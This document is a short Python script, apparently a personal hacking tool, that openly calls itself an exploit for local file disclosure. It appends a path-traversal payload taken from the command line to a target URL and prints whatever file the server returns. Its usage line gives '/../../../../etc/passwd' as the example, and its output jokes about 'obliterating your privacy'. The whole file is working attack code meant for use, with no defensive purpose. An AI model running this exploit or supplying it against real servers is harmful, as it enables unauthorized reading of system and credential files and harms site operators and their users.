#!/usr/bin/env python3
# Exploit for basic Local File Disclosure vulnerabilities
# This exploit supports only GET paramethers
# Made by: Sp1derM0rph3us

import requests, sys
import datetime as dt


def current_datetime():
    try:
        current_dtm = dt.datetime.now()
        current_datetime_format = current_dtm.strftime("%Y-%m-%d %H:%M:%S")
        return current_datetime_format

    except ValueError as e:
        print(f"Failed while converting datetime: {e}")
        return None

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} [target-url] [file]")
        print(f"E. g. {sys.argv[0]} http://test.com/download?file= /../../../../etc/passwd\r")
        return 0
    else:
        url = str(sys.argv[1])
        payload = str(sys.argv[2])
        # cookie = {'COOKIE-NAME': 'COOKIE-VALUE'}
        current_dtm = current_datetime()

        print(f"[+] Exploitation starting at: {current_dtm}")
        print("[*] Sending exploit...")
        # resp = request.get(url+payload, cookies=cookie)
        resp = requests.get(url+payload)


        if resp.status_code == 200:
            print("[*] Retrieving file...")
            content = resp.text
            print(content+"\r\n")
            current_dtm = current_datetime()
            print(f"Exploit ended at: {current_dtm}\r\n")
            print("\r\n-- Obliterating your privacy, as usual ;)\r\n")
            return 0

        else:
            print("[-] Failed to retrieve file, target may not be vulnerable, the file doesn't exist or the request is malformed.")
            print("\r\n-- Obliterating your privacy, as usual ;)\r\n")
            return -1

if __name__ == "__main__":
    main()
